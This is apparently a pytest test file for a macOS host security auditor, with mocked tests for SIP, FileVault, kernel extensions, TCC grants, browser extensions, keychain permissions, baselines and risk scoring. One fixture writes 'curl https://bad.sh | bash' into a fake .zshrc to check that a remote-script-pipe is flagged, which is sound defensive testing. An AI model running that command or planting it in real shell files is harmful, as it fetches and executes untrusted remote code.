"""Tests for the remaining audits (batches A–E)."""
import os
import sys
import stat
import time
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import procmon


# ── Batch A ───────────────────────────────────────────────────────────────


class TestSystemHardening:
    def test_flags_sip_disabled(self):
        def fake(argv, **_):
            cmd = argv[0] if argv else ""
            if cmd == "csrutil" and "status" in argv:
                return (0, "System Integrity Protection status: disabled.", "")
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake), \
             patch.object(procmon, "_read_plist_defaults", return_value={}), \
             patch("os.path.exists", return_value=False):
            findings = procmon._audit_system_hardening()
        assert any(f["severity"] == "CRITICAL"
                   and "SIP" in f["message"] or "Integrity" in f["message"]
                   for f in findings)

    def test_flags_filevault_off(self):
        def fake(argv, **_):
            cmd = argv[0] if argv else ""
            if cmd == "csrutil":
                return (0, "System Integrity Protection: enabled.", "")
            if cmd == "spctl":
                return (0, "assessments enabled", "")
            if cmd == "fdesetup":
                return (0, "FileVault is Off.", "")
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake), \
             patch.object(procmon, "_read_plist_defaults", return_value={}), \
             patch("os.path.exists", return_value=False):
            findings = procmon._audit_system_hardening()
        assert any(f["severity"] == "HIGH" and "FileVault" in f["message"]
                   for f in findings)


class TestKernelBoot:
    def test_flags_third_party_kexts(self):
        kmutil_out = (
            "No variant specified, falling back to release\n"
            "    1  218 0 0 0 com.apple.kpi.bsd (25.3.0) UUID <>\n"
            "    2   11 0 0 0 com.evil.rootkit (1.0) UUID <>\n"
        )

        def fake(argv, **_):
            cmd = argv[0] if argv else ""
            if cmd == "kmutil":
                return (0, kmutil_out, "")
            if cmd == "nvram":
                return (0, "", "")
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake), \
             patch.object(procmon, "_list_system_extensions", return_value=[]), \
             patch("os.path.isdir", return_value=False):
            findings = procmon._audit_kernel_boot()
        assert any("1 third-party kext" in f["message"] for f in findings)
        assert any("com.evil.rootkit" in (f.get("evidence") or "")
                   for f in findings)


class TestPatchPosture:
    def test_flags_unsupported_major(self):
        def fake(argv, **_):
            if "-productVersion" in argv:
                return (0, "11.7.0", "")
            if "-buildVersion" in argv:
                return (0, "20G1813", "")
            return (0, "No new software available.", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake), \
             patch.object(procmon, "_read_plist_defaults", return_value={}):
            findings = procmon._audit_patch_posture()
        assert any("outside the supported branches" in f["message"]
                   for f in findings)


# ── Batch B ───────────────────────────────────────────────────────────────


class TestTccAudit:
    def test_flags_fda_grant_high(self):
        def fake_query():
            return [{
                "service": "kTCCServiceSystemPolicyAllFiles",
                "client": "com.evil.app",
                "client_type": 0, "auth_value": 2, "auth_reason": 0,
                "last_modified": 0,
                "db": "/Library/Application Support/com.apple.TCC/TCC.db",
            }]
        with patch.object(procmon, "_query_tcc_all_risky",
                          side_effect=fake_query):
            findings = procmon._audit_tcc_grants()
        assert any(f["severity"] == "HIGH"
                   and f["action"]
                   and f["action"]["type"] == "delete_tcc"
                   for f in findings)

    def test_apple_bundle_demoted_to_info(self):
        def fake_query():
            return [{
                "service": "kTCCServiceSystemPolicyAllFiles",
                "client": "com.apple.Finder",
                "client_type": 0, "auth_value": 2, "auth_reason": 0,
                "last_modified": 0, "db": "/Library/TCC.db",
            }]
        with patch.object(procmon, "_query_tcc_all_risky",
                          side_effect=fake_query):
            findings = procmon._audit_tcc_grants()
        assert any(f["severity"] == "INFO" for f in findings)


class TestChromiumNameResolution:
    def _make_ext(self, tmp_path, manifest_name, messages=None,
                  default_locale="en"):
        import json as _j
        vdir = tmp_path / "abc" / "1.0.0"
        vdir.mkdir(parents=True)
        manifest = {"name": manifest_name}
        if default_locale:
            manifest["default_locale"] = default_locale
        (vdir / "manifest.json").write_text(_j.dumps(manifest))
        if messages:
            locdir = vdir / "_locales" / default_locale
            locdir.mkdir(parents=True)
            (locdir / "messages.json").write_text(_j.dumps(messages))
        return str(vdir)

    def test_plain_name_returned_as_is(self, tmp_path):
        vdir = self._make_ext(tmp_path, "My Extension")
        name = procmon._resolve_extension_name(
            "My Extension", vdir, "en", "abcd")
        assert name == "My Extension"

    def test_msg_key_resolves_from_messages_json(self, tmp_path):
        vdir = self._make_ext(
            tmp_path, "__MSG_appName__",
            messages={"appName": {"message": "Keep My Tabs"}})
        name = procmon._resolve_extension_name(
            "__MSG_appName__", vdir, "en",
            "hoklmmgfnpapgjgcpechhaamimifchmp")
        assert name == "Keep My Tabs"

    def test_msg_key_case_insensitive_lookup(self, tmp_path):
        vdir = self._make_ext(
            tmp_path, "__MSG_APPNAME__",
            messages={"appname": {"message": "CaseShifted"}})
        name = procmon._resolve_extension_name(
            "__MSG_APPNAME__", vdir, "en", "id1")
        assert name == "CaseShifted"

    def test_msg_key_falls_through_to_en_when_default_missing(self, tmp_path):
        import json as _j
        # Extension advertises default_locale=fr but only has en messages
        vdir = tmp_path / "abc" / "1.0.0"
        vdir.mkdir(parents=True)
        (vdir / "manifest.json").write_text(_j.dumps({
            "name": "__MSG_appName__", "default_locale": "fr"}))
        en_dir = vdir / "_locales" / "en"
        en_dir.mkdir(parents=True)
        (en_dir / "messages.json").write_text(_j.dumps({
            "appName": {"message": "FallbackName"}}))
        name = procmon._resolve_extension_name(
            "__MSG_appName__", str(vdir), "fr", "id1")
        assert name == "FallbackName"

    def test_unresolvable_msg_key_returns_id(self, tmp_path):
        # _locales present but the key doesn't exist
        vdir = self._make_ext(
            tmp_path, "__MSG_missing__",
            messages={"something_else": {"message": "other"}})
        name = procmon._resolve_extension_name(
            "__MSG_missing__", vdir, "en", "fallback_id")
        assert name == "fallback_id"

    def test_no_locales_dir_returns_id(self, tmp_path):
        vdir = tmp_path / "abc" / "1.0.0"
        vdir.mkdir(parents=True)
        name = procmon._resolve_extension_name(
            "__MSG_appName__", str(vdir), "en", "fallback_id")
        assert name == "fallback_id"


class TestBrowserExtensions:
    def test_audit_uses_resolved_name(self, tmp_path):
        import json as _j
        root = tmp_path / "Chrome" / "Default" / "Extensions" / "abc"
        v = root / "1.0.0"
        v.mkdir(parents=True)
        (v / "manifest.json").write_text(_j.dumps({
            "name": "__MSG_appName__", "default_locale": "en"}))
        locdir = v / "_locales" / "en"
        locdir.mkdir(parents=True)
        (locdir / "messages.json").write_text(_j.dumps({
            "appName": {"message": "Pretty Name"}}))
        with patch.object(procmon, "_EFFECTIVE_HOME", str(tmp_path)):
            exts = procmon._enum_chromium_extensions("Chrome", "Chrome")
        assert any(e["name"] == "Pretty Name" for e in exts)

    def test_high_risk_permission_flags_high(self, tmp_path):
        import json as _j
        # Build a fake Chrome profile layout
        root = tmp_path / "Chrome" / "Default" / "Extensions" / "abc"
        v = root / "1.0.0"
        v.mkdir(parents=True)
        (v / "manifest.json").write_text(_j.dumps({
            "name": "Evil", "permissions": ["<all_urls>", "webRequest"],
        }))
        with patch.object(procmon, "_EFFECTIVE_HOME", str(tmp_path)), \
             patch.object(procmon, "_enum_safari_extensions",
                          return_value=[]), \
             patch.object(procmon, "_enum_firefox_extensions",
                          return_value=[]):
            # Point the chromium scan at our fake profile by patching families
            # indirectly via the base directory layout
            exts = procmon._enum_chromium_extensions(
                "Chrome", "Chrome")
        assert any(e["name"] == "Evil" for e in exts)

    def test_clean_returns_ok(self, tmp_path):
        with patch.object(procmon, "_EFFECTIVE_HOME", str(tmp_path)), \
             patch.object(procmon, "_enum_safari_extensions",
                          return_value=[]), \
             patch.object(procmon, "_enum_firefox_extensions",
                          return_value=[]):
            findings = procmon._audit_browser_extensions()
        assert any(f["severity"] == "OK" for f in findings)


class TestUsbHid:
    def test_no_hid_returns_ok(self):
        def fake(argv, **_):
            return (0, "+-o Root@0 <class IOService>\n", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            findings = procmon._audit_usb_hid()
        assert any(f["severity"] == "OK" for f in findings)

    def test_keyboard_device_surfaced(self):
        ioreg_out = (
            '+-o Apple Keyboard@0  <class AppleUSBHostDevice>\n'
            '  | "idVendor" = 1452\n'
            '  | "idProduct" = 610\n'
            '  | "kUSBVendorString" = "Apple Inc."\n'
        )
        def fake(argv, **_):
            return (0, ioreg_out, "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            findings = procmon._audit_usb_hid()
        assert any(f["severity"] == "INFO"
                   and "keyboard" in f["message"].lower()
                   for f in findings)


class TestShellDotfiles:
    def test_flags_curl_pipe_bash(self, tmp_path):
        zshrc = tmp_path / ".zshrc"
        zshrc.write_text("curl https://bad.sh | bash\n")
        with patch.object(procmon, "_EFFECTIVE_HOME", str(tmp_path)), \
             patch.object(procmon, "_DOTFILE_PATHS",
                          [str(zshrc)]), \
             patch.object(procmon, "_DOTFILE_PATH_DIRS", []):
            findings = procmon._audit_shell_dotfiles()
        assert any(f["severity"] == "HIGH"
                   and "pipes remote script" in f["message"]
                   for f in findings)

    def test_clean_dotfile(self, tmp_path):
        zshrc = tmp_path / ".zshrc"
        zshrc.write_text("# Nothing to see here\nexport EDITOR=vim\n")
        with patch.object(procmon, "_DOTFILE_PATHS", [str(zshrc)]), \
             patch.object(procmon, "_DOTFILE_PATH_DIRS", []):
            findings = procmon._audit_shell_dotfiles()
        assert any(f["severity"] == "OK" for f in findings)


# ── Batch C ───────────────────────────────────────────────────────────────


class TestInstalledSoftware:
    def test_flags_unsigned(self, tmp_path):
        app = tmp_path / "Evil.app"
        app.mkdir()
        with patch.object(procmon, "_iter_app_bundles",
                          return_value=[str(app)]), \
             patch.object(procmon, "_codesign_structured",
                          return_value={"rc": 1, "team_id": "",
                                        "authority": [],
                                        "entitlements_xml": "",
                                        "hardened_runtime": False}), \
             patch.object(procmon, "_is_apple_signed", return_value=False):
            findings = procmon._audit_installed_software()
        assert any(f["severity"] == "HIGH"
                   and "Evil.app" in f["message"]
                   and "unsigned" in f["message"].lower()
                   for f in findings)


class TestFilesystemIntegrity:
    def test_flags_world_writable_sudoers(self, tmp_path, monkeypatch):
        sudoers = tmp_path / "sudoers"
        sudoers.write_text("Defaults\n")
        os.chmod(sudoers, 0o666)

        monkeypatch.setattr(
            procmon, "_FS_SENSITIVE_FILES",
            [(str(sudoers), 0o440, "root", "wheel")])

        def fake(argv, **_):
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            findings = procmon._audit_filesystem_integrity()
        assert any(f["severity"] == "CRITICAL"
                   and "world- or group-writable" in f["message"]
                   for f in findings)


class TestSensitivePathsDelta:
    def test_lists_recent_changes(self, tmp_path, monkeypatch):
        fake_root = tmp_path / "LaunchAgents"
        fake_root.mkdir()
        new_plist = fake_root / "recent.plist"
        new_plist.write_text("<plist/>\n")
        monkeypatch.setattr(procmon, "_SENSITIVE_PATH_ROOTS",
                             [str(fake_root)])
        findings = procmon._audit_sensitive_paths_delta(window_days=7)
        assert any("recent.plist" in f["message"] for f in findings)

    def test_empty_window_returns_ok(self, tmp_path, monkeypatch):
        fake_root = tmp_path / "empty"
        fake_root.mkdir()
        old_file = fake_root / "ancient.plist"
        old_file.write_text("<plist/>\n")
        os.utime(str(old_file), (time.time() - 365*86400,
                                 time.time() - 365*86400))
        monkeypatch.setattr(procmon, "_SENSITIVE_PATH_ROOTS",
                             [str(fake_root)])
        findings = procmon._audit_sensitive_paths_delta(window_days=7)
        assert any(f["severity"] == "OK" for f in findings)


# ── Batch D ───────────────────────────────────────────────────────────────


class TestKeychainCredentials:
    def test_flags_group_readable_user_keychain(self, tmp_path, monkeypatch):
        kc = tmp_path / "login.keychain-db"
        kc.write_bytes(b"\x00")
        os.chmod(kc, 0o644)  # group+world readable

        def fake(argv, **_):
            cmd = argv[0] if argv else ""
            if cmd == "security" and "user" in argv:
                return (0, f'"{kc}"\n', "")
            if cmd == "security":
                return (0, "", "")
            if cmd == "fdesetup":
                return (0, "alex, UUID\n", "")
            if cmd == "dscl":
                return (0, "alex\n", "")
            if cmd == "sysadminctl":
                return (0, "", "Secure Token: ENABLED\n")
            return (0, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            findings = procmon._audit_keychain_credentials()
        assert any(f["severity"] == "CRITICAL"
                   and "group/world readable" in f["message"]
                   for f in findings)
        finding = next(f for f in findings
                       if "group/world readable" in f["message"])
        assert finding["action"] == {
            "type": "fix_keychain_permissions",
            "path": str(kc),
            "target_mode": "0600",
        }


class TestAuthStack:
    def test_flags_unsigned_plugin(self, tmp_path, monkeypatch):
        plugin = tmp_path / "Evil.bundle"
        plugin.mkdir()
        monkeypatch.setattr(procmon, "_AUTH_PLUGIN_ROOTS",
                             [str(tmp_path)])
        monkeypatch.setattr(procmon, "_PAM_DIR", str(tmp_path / "nope"))

        def fake(argv, **_):
            return (1, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake), \
             patch.object(procmon, "_codesign_structured",
                          return_value={"rc": 1, "team_id": "",
                                        "authority": []}), \
             patch.object(procmon, "_is_apple_signed", return_value=False):
            findings = procmon._audit_authentication_stack()
        assert any(f["severity"] == "CRITICAL"
                   and "Evil.bundle" in f["message"]
                   for f in findings)


class TestPackageManagers:
    def test_no_package_managers_returns_ok(self, tmp_path, monkeypatch):
        # Point _EFFECTIVE_HOME at an empty tmp dir so ~/.cargo/bin is missing
        monkeypatch.setattr(procmon, "_EFFECTIVE_HOME", str(tmp_path))
        def fake(argv, **_):
            return (1, "", "")
        with patch.object(procmon, "_run_cmd_short", side_effect=fake):
            findings = procmon._audit_package_managers()
        assert any(f["severity"] == "OK" for f in findings)


# ── Batch E ───────────────────────────────────────────────────────────────


class TestBaseline:
    def test_collect_baseline_snapshot_shape(self):
        with patch.object(procmon, "_enumerate_launch_items", return_value=[]), \
             patch.object(procmon, "_list_system_extensions", return_value=[]), \
             patch.object(procmon, "_list_listening_sockets", return_value=[]), \
             patch.object(procmon, "_list_config_profiles", return_value=[]), \
             patch.object(procmon, "_sharing_services_state",
                          return_value={"remote_login": False}):
            snap = procmon._collect_baseline_snapshot()
        assert snap["version"] == 1
        for key in ("launch_items", "system_extensions", "listening_ports",
                    "config_profiles", "sharing"):
            assert key in snap

    def test_save_and_load_baseline_roundtrip(self, tmp_path, monkeypatch):
        path = tmp_path / "baseline.json"
        monkeypatch.setattr(procmon, "_BASELINE_PATH", str(path))
        snap = {"version": 1, "launch_items": [], "listening_ports": [],
                "system_extensions": [], "config_profiles": [],
                "sharing": {}, "captured_at": int(time.time())}
        assert procmon._save_baseline(snap) is True
        loaded = procmon._load_baseline()
        assert loaded["version"] == 1

    def test_baseline_delta_no_baseline(self, monkeypatch, tmp_path):
        monkeypatch.setattr(procmon, "_BASELINE_PATH",
                             str(tmp_path / "nope.json"))
        findings = procmon._audit_baseline_delta()
        assert any(f["action"]
                   and f["action"]["type"] == "capture_baseline"
                   for f in findings)

    def test_baseline_delta_flags_new_launch_item(self, tmp_path, monkeypatch):
        import json as _j
        path = tmp_path / "baseline.json"
        monkeypatch.setattr(procmon, "_BASELINE_PATH", str(path))
        baseline = {
            "version": 1, "captured_at": int(time.time()),
            "launch_items": [{"path": "/a.plist", "label": "a",
                              "program": "/a", "hash": "h"}],
            "system_extensions": [],
            "listening_ports": [], "config_profiles": [], "sharing": {},
        }
        path.write_text(_j.dumps(baseline))
        with patch.object(procmon, "_collect_baseline_snapshot",
                          return_value={
                              "launch_items": [
                                  {"path": "/a.plist", "label": "a",
                                   "program": "/a", "hash": "h"},
                                  {"path": "/new.plist", "label": "new",
                                   "program": "/new", "hash": "h2"},
                              ],
                              "system_extensions": [],
                              "listening_ports": [],
                              "config_profiles": [], "sharing": {}}):
            findings = procmon._audit_baseline_delta()
        assert any("NEW launch item" in f["message"] for f in findings)


class TestRuleEngine:
    def test_path_exists_rule_fires(self, tmp_path):
        target = tmp_path / "marker"
        target.write_text("x")
        rule = {"id": "TEST-1", "kind": "path_exists", "severity": "HIGH",
                "message": "marker present",
                "params": {"path": str(target)}}
        res = procmon._evaluate_rule(rule)
        assert res is not None
        assert res["severity"] == "HIGH"

    def test_file_mode_rule_fires_for_world_writable(self, tmp_path):
        target = tmp_path / "wide_open"
        target.write_text("x")
        os.chmod(target, 0o666)
        rule = {"id": "TEST-2", "kind": "file_mode", "severity": "CRITICAL",
                "message": "ww",
                "params": {"path": str(target),
                           "forbid_mode_bits": 0o002}}
        res = procmon._evaluate_rule(rule)
        assert res is not None
        assert res["severity"] == "CRITICAL"

    def test_file_mode_rule_silent_when_safe(self, tmp_path):
        target = tmp_path / "safe"
        target.write_text("x")
        os.chmod(target, 0o600)
        rule = {"id": "TEST-3", "kind": "file_mode", "severity": "CRITICAL",
                "message": "ww",
                "params": {"path": str(target),
                           "forbid_mode_bits": 0o002}}
        assert procmon._evaluate_rule(rule) is None


class TestScoring:
    def test_clean_host_scores_high(self):
        results = {
            "network": [{"severity": "OK", "message": "ok", "action": None}],
            "dns": [{"severity": "OK", "message": "ok", "action": None}],
            "system_hardening": [{"severity": "OK", "message": "ok", "action": None}],
            "kernel_boot": [{"severity": "OK", "message": "ok", "action": None}],
        }
        s = procmon._score_findings(results)
        assert s["global"] == 100
        assert s["fix_first"] == []

    def test_critical_pulls_score_down(self):
        results = {
            "network": [{"severity": "CRITICAL", "message": "bad",
                         "action": {"type": "enable_alf"}}],
            "system_hardening": [],
            "kernel_boot": [],
            "dns": [],
        }
        s = procmon._score_findings(results)
        assert s["global"] < 100
        assert len(s["fix_first"]) == 1

    def test_band_labels(self):
        assert procmon._severity_band(95) == "GREEN"
        assert procmon._severity_band(70) == "YELLOW"
        assert procmon._severity_band(50) == "ORANGE"
        assert procmon._severity_band(20) == "RED"

    def test_layer_weights_sum_to_one(self):
        assert abs(sum(procmon._LAYER_WEIGHT.values()) - 1.0) < 1e-6


# ── UI registration ────────────────────────────────────────────────────────


class TestAuditRegistration:
    def test_all_audit_keys_registered(self):
        expected = {
            "process_triage",
            "network", "dns", "persistence",
            "system_hardening", "kernel_boot", "patch_posture",
            "tcc", "browser_exts", "usb_hid", "shell_dotfiles",
            "installed_software", "process_entitlements",
            "injection_antidebug",
            "filesystem_integrity", "sensitive_paths_delta",
            "keychain", "auth_stack", "binary_authorization",
            "tool_correlation", "packages",
            "baseline_delta", "rule_engine", "global_score",
        }
        registered = set(procmon.ProcMonUI._AUDIT_SCANS.keys())
        missing = expected - registered
        assert not missing, f"missing audit registrations: {missing}"

    def test_a_keybinding_opens_audit_menu(self, monitor):
        monitor._detail_focus = False
        with patch.object(monitor, "_prompt_audit") as prompt:
            monitor.handle_input(ord("a"))
        prompt.assert_called_once()

    def test_forensic_menu_has_section_headers(self, monitor):
        headers = [r for r in monitor._FORENSIC_ROWS if r[1] == "header"]
        labels = {h[0] for h in headers}
        assert labels == {"Selected Process"}

    def test_audit_menu_has_section_headers(self, monitor):
        headers = [r for r in monitor._AUDIT_ROWS if r[1] == "header"]
        labels = {h[0] for h in headers}
        assert labels == {"SecAuditor Browser/API"}

    def test_audit_menu_opens_secauditor_first(self, monitor):
        actions = [r[2] for r in monitor._AUDIT_ROWS if r[1] == "action"]
        assert actions[0] == "open_secauditor"
        assert actions[1] == "show_secauditor"

    def test_audit_menu_does_not_contain_legacy_full_scan(self, monitor):
        payloads = {r[2] for r in monitor._AUDIT_ROWS if r[1] == "action"}
        assert "automated_security_scan" not in payloads

    def test_forensic_menu_stays_selected_process_scoped(self, monitor):
        payloads = {r[2] for r in monitor._FORENSIC_ROWS if r[1] == "action"}
        assert payloads == {"inspect", "triage", "network"}

    def test_usb_hid_is_not_a_process_monitor_menu_item(self, monitor):
        payloads = {r[2] for r in monitor._AUDIT_ROWS if r[1] == "action"}
        assert "usb_hid" not in payloads
        assert "open_secauditor" in payloads

    def test_dispatch_forensic_action_runs_audit_for_cross_links(self, monitor):
        with patch.object(monitor, "_toggle_audit_mode") as tog:
            monitor._dispatch_forensic_action("audit:usb_hid")
        tog.assert_called_once_with("usb_hid")

    def test_dispatch_forensic_action_plain_toggle(self, monitor):
        with patch.object(monitor, "_toggle_inspect_mode") as tog:
            monitor._dispatch_forensic_action("inspect")
        tog.assert_called_once()

    def test_host_audits_are_not_reachable_from_procmon_menus(self, monitor):
        """Host-wide audits moved to the SecAuditor browser/API product."""
        audit_rows = [r for r in monitor._AUDIT_ROWS if r[1] == "action"]
        audit_actions = {r[2] for r in audit_rows}
        forensic_rows = [r for r in monitor._FORENSIC_ROWS
                         if r[1] == "action"]
        forensic_actions = {r[2] for r in forensic_rows}
        assert audit_actions == {"open_secauditor", "show_secauditor"}
        assert forensic_actions == {"inspect", "triage", "network"}


class TestNewDispatchActions:
    def test_dispatch_capture_baseline(self, monitor, tmp_path, monkeypatch):
        import threading
        monitor._log_messages = []
        monitor._log_lock = threading.Lock()
        monitor._log_max = 100
        monkeypatch.setattr(procmon, "_BASELINE_PATH",
                             str(tmp_path / "baseline.json"))
        with patch.object(procmon, "_collect_baseline_snapshot",
                          return_value={"version": 1,
                                        "launch_items": [],
                                        "listening_ports": [],
                                        "system_extensions": [],
                                        "config_profiles": [],
                                        "sharing": {},
                                        "captured_at": 0}):
            ok, msg = monitor._dispatch_audit_action(
                {"type": "capture_baseline"})
        assert ok is True

    def test_dispatch_enable_gatekeeper(self, monitor):
        import threading
        monitor._log_messages = []
        monitor._log_lock = threading.Lock()
        monitor._log_max = 100
        with patch.object(procmon, "_run_cmd_short",
                          return_value=(0, "", "")) as run:
            ok, msg = monitor._dispatch_audit_action(
                {"type": "enable_gatekeeper"})
        assert ok is True
        assert run.call_args[0][0][0] == "spctl"
